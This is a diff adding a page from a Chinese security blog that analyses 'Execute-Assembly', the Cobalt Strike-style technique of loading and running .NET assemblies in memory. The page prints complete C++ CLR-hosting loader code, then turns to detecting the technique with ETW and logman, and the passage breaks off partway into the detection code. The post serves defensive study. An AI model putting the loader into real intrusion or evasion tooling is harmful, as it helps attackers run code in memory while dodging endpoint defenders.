@@ -1,0 +1,809 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.3">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="HaCky的安全备忘录" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="0x01 Execute-Assembly 原理&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;在《Cobalt Strike 原理分析》一文中，介绍了内存加载程序集(Assembly)的主要有四步：  1&amp;gt; 加载CLR环境 2&amp;gt; 获取程序域 3&amp;gt; 装载程序集 4&amp;gt; 执行程序集">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Execute-Assembly 攻守之道">
+<meta property="og:url" content="https://findream.github.io/2023/04/02/Execute-Assembly攻守之道/index.html">
+<meta property="og:site_name" content="HaCky的安全备忘录">
+<meta property="og:description" content="0x01 Execute-Assembly 原理&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;在《Cobalt Strike 原理分析》一文中，介绍了内存加载程序集(Assembly)的主要有四步：  1&amp;gt; 加载CLR环境 2&amp;gt; 获取程序域 3&amp;gt; 装载程序集 4&amp;gt; 执行程序集">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://hacky.wang/blog/20221106/jdkBRwsOr2Rm.png?imageslim">
+<meta property="og:image" content="http://hacky.wang/blog/20221106/9SX9QK1UG3uY.png?imageslim">
+<meta property="og:image" content="http://hacky.wang/blog/20221106/v2mzD38DdnOO.png?imageslim">
+<meta property="og:image" content="http://hacky.wang/blog/20221106/iRXfBirGesVi.png?imageslim">
+<meta property="og:image" content="http://hacky.wang/blog/20221106/FV5jiQTNxadO.png?imageslim">
+<meta property="og:image" content="http://hacky.wang/blog/20221106/dQi0NPKfkE8R.png?imageslim">
+<meta property="og:updated_time" content="2023-05-02T07:22:31.803Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Execute-Assembly 攻守之道">
+<meta name="twitter:description" content="0x01 Execute-Assembly 原理&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;在《Cobalt Strike 原理分析》一文中，介绍了内存加载程序集(Assembly)的主要有四步：  1&amp;gt; 加载CLR环境 2&amp;gt; 获取程序域 3&amp;gt; 装载程序集 4&amp;gt; 执行程序集">
+<meta name="twitter:image" content="http://hacky.wang/blog/20221106/jdkBRwsOr2Rm.png?imageslim">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://findream.github.io/2023/04/02/Execute-Assembly攻守之道/"/>
+
+
+
+
+
+  <title>Execute-Assembly 攻守之道 | HaCky的安全备忘录</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">HaCky的安全备忘录</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-schedule">
+          <a href="/schedule/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-calendar"></i> <br />
+            
+            日程表
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-sitemap">
+          <a href="/sitemap.xml" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br />
+            
+            站点地图
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-commonweal">
+          <a href="/404/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-heartbeat"></i> <br />
+            
+            公益404
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://findream.github.io/2023/04/02/Execute-Assembly攻守之道/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="HaCky">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="HaCky的安全备忘录">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Execute-Assembly 攻守之道</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2023-04-02T20:45:11+08:00">
+                2023-04-02
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Windows-攻防/" itemprop="url" rel="index">
+                    <span itemprop="name">Windows 攻防</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="0x01-Execute-Assembly-原理"><a href="#0x01-Execute-Assembly-原理" class="headerlink" title="0x01 Execute-Assembly 原理"></a>0x01 Execute-Assembly 原理</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在《Cobalt Strike 原理分析》一文中，介绍了内存加载程序集(Assembly)的主要有四步：</p>
+<ul>
+<li>1&gt; 加载CLR环境</li>
+<li>2&gt; 获取程序域</li>
+<li>3&gt; 装载程序集</li>
+<li>4&gt; 执行程序集</li>
+</ul>
+<a id="more"></a>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在odzhan的<a href="https://modexp.wordpress.com/2019/05/10/dotnet-loader-shellcode/" target="_blank" rel="external">Shellcode: Loading .NET Assemblies From Memory</a>所描述的那样，.Net Framework随着版本的更新，使用了不同的接口，.Net Framework V1.0 采用的是<code>ICorRuntimeHost接口</code>，支持v1.0.3705, v1.1.4322, v2.0.50727和v4.0.30319。到了.Net Framework v2.0，采用<code>ICLRRuntimeHost接口</code>，支持v2.0.50727和v4.0.30319。然后到了.Net Framework v4.0，则使用了<code>ICLRMetaHost接口</code>,但是可能不再兼容4.0以下的.Net Framework。所以使用<code>ICLRMetaHost接口</code>并不是一个非常合适的接口。</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我们可以使用多个函数进行接口的实例化，最常见的可能属<code>CoCreateInstance</code>或者<code>CLRCreateInstance</code>。<br><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">CoInitializeEx以及CoCreateInstance</div><div class="line">CorBindToRuntime或者CorBindToRuntimeEx</div><div class="line"><span class="built_in">CLRCreateInstance</span>以及ICLRRuntimeInfo</div></pre></td></tr></table></figure></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;剩下的关于<code>获取程序域</code>,<code>装载程序集</code>,以及<code>执行程序集</code>在<a href="https://idiotc4t.com/defense-evasion/cobaltstrike-executeassembly-realization" target="_blank" rel="external">Execute-Assembly实现</a>都有具体实现。完整代码如下。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;metahost.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="meta">#import <span class="meta-string">"mscorlib.tlb"</span> raw_interfaces_only			\</span></div><div class="line">    	high_property_prefixes(<span class="string">"_get"</span>,<span class="string">"_put"</span>,<span class="string">"_putref"</span>)		\</div><div class="line">    	rename(<span class="string">"ReportEvent"</span>, <span class="string">"InteropServices_ReportEvent"</span>)	\</div><div class="line">	rename(<span class="string">"or"</span>, <span class="string">"InteropServices_or"</span>)</div><div class="line"></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> mscorlib;</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">"MSCorEE.lib"</span>)</span></div><div class="line"></div><div class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, _TCHAR* argv[])</div><div class="line">&#123;</div><div class="line">	HANDLE hFile = CreateFileA(<span class="string">"CSharp.exe"</span>,</div><div class="line">		GENERIC_READ | GENERIC_WRITE,</div><div class="line">		FILE_SHARE_READ,</div><div class="line">		<span class="literal">NULL</span>,</div><div class="line">		OPEN_EXISTING,</div><div class="line">		FILE_ATTRIBUTE_NORMAL,</div><div class="line">		<span class="literal">NULL</span>);</div><div class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == hFile)</div><div class="line">	&#123;</div><div class="line">		<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">	&#125;</div><div class="line">	DWORD dwFileSize = GetFileSize(hFile, <span class="literal">NULL</span>);</div><div class="line">	<span class="keyword">if</span> (dwFileSize == <span class="number">0</span>)</div><div class="line">	&#123;</div><div class="line">		<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">	&#125;</div><div class="line">	PVOID dotnetRaw = <span class="built_in">malloc</span>(dwFileSize);</div><div class="line">	<span class="built_in">memset</span>(dotnetRaw, <span class="number">0</span>, dwFileSize);</div><div class="line">	DWORD dwReturn = <span class="number">0</span>;</div><div class="line">	<span class="keyword">if</span> (ReadFile(hFile, dotnetRaw, dwFileSize, &amp;dwReturn, <span class="literal">NULL</span>)==FALSE)</div><div class="line">	&#123;</div><div class="line">		<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	ICLRMetaHost* iMetaHost = <span class="literal">NULL</span>;</div><div class="line">	ICLRRuntimeInfo* iRuntimeInfo = <span class="literal">NULL</span>;</div><div class="line">	ICorRuntimeHost* iRuntimeHost = <span class="literal">NULL</span>;</div><div class="line">	IUnknownPtr pAppDomain = <span class="literal">NULL</span>;</div><div class="line">	_AppDomainPtr pDefaultAppDomain = <span class="literal">NULL</span>;</div><div class="line">	_AssemblyPtr pAssembly = <span class="literal">NULL</span>;</div><div class="line">	_MethodInfoPtr pMethodInfo = <span class="literal">NULL</span>;</div><div class="line">	SAFEARRAYBOUND saBound[<span class="number">1</span>];</div><div class="line">	<span class="keyword">void</span>* pData = <span class="literal">NULL</span>;</div><div class="line">	VARIANT vRet;</div><div class="line">	VARIANT vObj;</div><div class="line">	VARIANT vPsa;</div><div class="line">	SAFEARRAY* args = <span class="literal">NULL</span>;</div><div class="line"></div><div class="line">	<span class="comment">//检测点1</span></div><div class="line">	CLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost, (VOID**)&amp;iMetaHost);</div><div class="line">	iMetaHost-&gt;GetRuntime(<span class="string">L"v4.0.30319"</span>, IID_ICLRRuntimeInfo, (VOID**)&amp;iRuntimeInfo);</div><div class="line">	iRuntimeInfo-&gt;GetInterface(CLSID_CorRuntimeHost, IID_ICorRuntimeHost, (VOID**)&amp;iRuntimeHost);</div><div class="line">	iRuntimeHost-&gt;Start();</div><div class="line"></div><div class="line"></div><div class="line">	iRuntimeHost-&gt;GetDefaultDomain(&amp;pAppDomain);</div><div class="line">	pAppDomain-&gt;QueryInterface(__uuidof(_AppDomain), (VOID**)&amp;pDefaultAppDomain);</div><div class="line"></div><div class="line">	saBound[<span class="number">0</span>].cElements = dwFileSize;</div><div class="line">	saBound[<span class="number">0</span>].lLbound = <span class="number">0</span>;</div><div class="line">	SAFEARRAY* pSafeArray = SafeArrayCreate(VT_UI1, <span class="number">1</span>, saBound);</div><div class="line"></div><div class="line">	SafeArrayAccessData(pSafeArray, &amp;pData);</div><div class="line">	<span class="built_in">memcpy</span>(pData, dotnetRaw, dwFileSize);</div><div class="line">	<span class="comment">//free(dotnetRaw);   //释放1</span></div><div class="line">	SafeArrayUnaccessData(pSafeArray);</div><div class="line"></div><div class="line">	<span class="comment">//检测点2</span></div><div class="line">	pDefaultAppDomain-&gt;Load_3(pSafeArray, &amp;pAssembly);</div><div class="line">	<span class="comment">//free(pSafeArray-&gt;pvData);</span></div><div class="line">	pAssembly-&gt;get_EntryPoint(&amp;pMethodInfo);</div><div class="line"></div><div class="line">	ZeroMemory(&amp;vRet, <span class="keyword">sizeof</span>(VARIANT));</div><div class="line">	ZeroMemory(&amp;vObj, <span class="keyword">sizeof</span>(VARIANT));</div><div class="line">	vObj.vt = VT_NULL;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">	vPsa.vt = (VT_ARRAY | VT_BSTR);</div><div class="line">	args = SafeArrayCreateVector(VT_VARIANT, <span class="number">0</span>, <span class="number">1</span>);</div><div class="line"></div><div class="line">	<span class="keyword">if</span> (argc &gt; <span class="number">1</span>)</div><div class="line">	&#123;</div><div class="line">		vPsa.parray = SafeArrayCreateVector(VT_BSTR, <span class="number">0</span>, argc);</div><div class="line">		<span class="keyword">for</span> (<span class="keyword">long</span> i = <span class="number">0</span>; i &lt; argc; i++)</div><div class="line">		&#123;</div><div class="line">			SafeArrayPutElement(vPsa.parray, &amp;i, SysAllocString((OLECHAR*)argv[i]));</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		<span class="keyword">long</span> idx[<span class="number">1</span>] = &#123; <span class="number">0</span> &#125;;</div><div class="line">		SafeArrayPutElement(args, idx, &amp;vPsa);</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="comment">//检测点3</span></div><div class="line">	HRESULT hr = pMethodInfo-&gt;Invoke_3(vObj, args, &amp;vRet);</div><div class="line">	pMethodInfo-&gt;Release();</div><div class="line">	pAssembly-&gt;Release();</div><div class="line">	pDefaultAppDomain-&gt;Release();</div><div class="line">	iRuntimeInfo-&gt;Release();</div><div class="line">	iMetaHost-&gt;Release();</div><div class="line">	CoUninitialize();</div><div class="line">	getchar();</div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
+<h2 id="0x02-Execute-Assembly检测思路"><a href="#0x02-Execute-Assembly检测思路" class="headerlink" title="0x02 Execute-Assembly检测思路"></a>0x02 Execute-Assembly检测思路</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据上述的Execute-Assembly的实现原理，可以预测到Execute-Assembly主要有3个检测点。第一个检测点是加载CLR环境，第二个检测点是加载程序集，第三个检测点在于执行入口点的地方。在我看来，第一第二个检测点是比较好实现的。</p>
+<h3 id="0x2-1-ETW使用前置知识"><a href="#0x2-1-ETW使用前置知识" class="headerlink" title="0x2.1 ETW使用前置知识"></a>0x2.1 ETW使用前置知识</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据XPN在他的博文<a href="https://blog.xpnsec.com/hiding-your-dotnet-etw/" target="_blank" rel="external">Hiding your .NET - ETW</a>一文中指出利用ETW(Event Trace for Windows)检测CLR的加载。而ProcessHacker或者ProcessExplorer这两款工具都能从进程角度查看进程是否加载了CLR环境。<br>    <img src="http://hacky.wang/blog/20221106/jdkBRwsOr2Rm.png?imageslim" alt="mark"></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;使用<code>logman query providers</code>命令查看所有的提供者。如图，执行结果的第一项是提供者名称，第二项是提供者对应的GUID。<br>    <img src="http://hacky.wang/blog/20221106/9SX9QK1UG3uY.png?imageslim" alt="mark"></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;也可以通过设置指定得<code>provider name</code>或者<code>GUID</code>来获取具体的提供者的详细信息。即使用<code>logman query providers &lt;provider name&gt;</code>或者<code>logman query providers &lt;GUID&gt;</code>。</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过执行<code>logman query providers &quot;.NET Common Language Runtime&quot;</code>语句返回的结果如下。除了具有第一部分提供程序的名称和GUID之外，第二部分是一些关键字的信息，也就是筛选事件的标志。通过设置这些标志来筛选我们所需要的事件。第三部分是安全级别，而第四部分对应的是事件对应的进程ID和进程路径。<br><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div></pre></td><td class="code"><pre><div class="line">PS C:\Users\14349&gt; logman query providers ".NET Common Language Runtime"</div><div class="line"></div><div class="line">提供程序                                 GUID</div><div class="line">-------------------------------------------------------------------------------</div><div class="line"><span class="title">.NET Common Language Runtime             &#123;E13C0D23-CCBC-4E12-931B-D9CC2EEE27E4&#125;</span></div><div class="line"></div><div class="line">值                   关键字                  描述</div><div class="line">-------------------------------------------------------------------------------</div><div class="line">0x0000000000000001  GCKeyword            GC</div><div class="line">0x0000000000000002  GCHandleKeyword      GCHandle</div><div class="line">0x0000000000000004  FusionKeyword        Binder</div><div class="line">0x0000000000000008  LoaderKeyword        Loader</div><div class="line">0x0000000000000010  JitKeyword           Jit</div><div class="line">0x0000000000000020  NGenKeyword          NGen</div><div class="line">0x0000000000000040  StartEnumerationKeyword StartEnumeration</div><div class="line">0x0000000000000080  EndEnumerationKeyword StopEnumeration</div><div class="line">0x0000000000000400  SecurityKeyword      Security</div><div class="line">0x0000000000000800  AppDomainResourceManagementKeyword AppDomainResourceManagement</div><div class="line">0x0000000000001000  JitTracingKeyword    JitTracing</div><div class="line">0x0000000000002000  InteropKeyword       Interop</div><div class="line">0x0000000000004000  ContentionKeyword    Contention</div><div class="line">0x0000000000008000  ExceptionKeyword     Exception</div><div class="line">0x0000000000010000  ThreadingKeyword     Threading</div><div class="line">0x0000000000020000  JittedMethodILToNativeMapKeyword JittedMethodILToNativeMap</div><div class="line">0x0000000000040000  OverrideAndSuppressNGenEventsKeyword OverrideAndSuppressNGenEvents</div><div class="line">0x0000000000080000  TypeKeyword          Type</div><div class="line">0x0000000000100000  GCHeapDumpKeyword    GCHeapDump</div><div class="line">0x0000000000200000  GCSampledObjectAllocationHighKeyword GCSampledObjectAllocationHigh</div><div class="line">0x0000000000400000  GCHeapSurvivalAndMovementKeyword GCHeapSurvivalAndMovement</div><div class="line">0x0000000000800000  GCHeapCollectKeyword GCHeapCollect</div><div class="line">0x0000000001000000  GCHeapAndTypeNamesKeyword GCHeapAndTypeNames</div><div class="line">0x0000000002000000  GCSampledObjectAllocationLowKeyword GCSampledObjectAllocationLow</div><div class="line">0x0000000020000000  PerfTrackKeyword     PerfTrack</div><div class="line">0x0000000040000000  StackKeyword         Stack</div><div class="line">0x0000000080000000  ThreadTransferKeyword ThreadTransfer</div><div class="line">0x0000000100000000  DebuggerKeyword      Debugger</div><div class="line">0x0000000200000000  MonitoringKeyword    Monitoring</div><div class="line"></div><div class="line">值                   级别                   描述</div><div class="line">-------------------------------------------------------------------------------</div><div class="line">0x00                win:LogAlways        Log Always</div><div class="line">0x02                win:Error            Error</div><div class="line">0x04                win:Informational    Information</div><div class="line">0x05                win:Verbose          Verbose</div><div class="line"></div><div class="line">PID                 映像</div><div class="line">-------------------------------------------------------------------------------</div><div class="line">0x000035a8          C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</div><div class="line">0x000022dc          F:\users\MPic 2.2.1.3\MPic.exe</div><div class="line">0x000033c8          F:\users\markdownpad2-portable\MarkdownPad2.exe</div><div class="line">0x00001b3c          C:\Program Files\CONEXANT\SAII\SmartAudio.exe</div><div class="line">0x00001818</div><div class="line">0x00000e34</div><div class="line"></div><div class="line"></div><div class="line">命令成功结束。</div></pre></td></tr></table></figure></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;XPN在他的博文<a href="https://blog.xpnsec.com/hiding-your-dotnet-etw/" target="_blank" rel="external">Hiding your .NET - ETW</a>中，也给出了验证测试代码,代码的功能简而言之就是通过ETW<code>实时的</code>捕获<code>.NET Common Language Runtime</code>提供者的<code>AssemblyDCStart_V1</code>事件。但是这个验证代码有一个缺陷就是，只有当Assembly Loader进程退出后才能捕获对应的<code>AssemblyDCStart_V1</code>事件。但是，这对我来说是致命的。所以我尝试使用krabsetw库来实现。</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">define</span> AssemblyDCStart_V1 155</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> LoaderKeyword 0x08</span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span 